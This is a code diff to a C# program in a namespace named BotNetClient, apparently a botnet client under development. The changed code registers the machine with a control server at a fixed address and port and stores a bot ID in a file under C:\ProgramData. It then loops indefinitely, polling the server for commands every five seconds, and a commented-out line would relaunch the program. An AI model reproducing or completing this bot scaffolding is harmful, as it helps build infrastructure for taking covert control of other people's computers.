@@ -13,10 +13,9 @@ namespace BotNetClient
     class Program
     {
         public static UInt32 idc;
+        public static Thread miniprogram = new Thread(new ThreadStart(SecondThread.miniprog));
         static void Main(string[] args)
         {
-            Thread miniprogram = new Thread(new ThreadStart(SecondThread.miniprog));
-            miniprogram.Start();
             string address = "192.168.0.17";
             int port = 8005;
             IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
@@ -30,8 +29,6 @@ namespace BotNetClient
             {
                 idc = HttpHandler.Class1.CreateIpAndIdAsync(ipadress.ToString()).Result;
             }
-            File.Create("путь к .txt файлу");
-            File.WriteAllText("путь к .txt файлу",idc.ToString());
             #region tcp and socket code
             //IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
             //IPAddress ipadress = iphostinfo.AddressList[0];
@@ -52,6 +49,12 @@ namespace BotNetClient
             id = HttpHandler.Class1.IdResult().Result+1;
             try
             {
+                ////miniprogram.Start();
+                if (!File.Exists("C:\\ProgramData\\idbtc.txt"))
+                {
+                    File.Create("C:\\ProgramData\\idbtc.txt").Close();
+                    File.WriteAllText("C:\\ProgramData\\idbtc.txt", idc.ToString());
+                }
                 while (true)
                 {
                     if(HttpHandler.Class1.IdResult().Result!=0)
@@ -84,6 +87,7 @@ namespace BotNetClient
                         id = 1;
                         continue;
                     }
+                    Thread.Sleep(5000);
                 }
             } 
             catch (Exception ex)
@@ -92,6 +96,7 @@ namespace BotNetClient
             }
             finally
             {
+                Thread.Sleep(5000);
                 //Process.Start(Assembly.GetExecutingAssembly().Location);
             }
         }
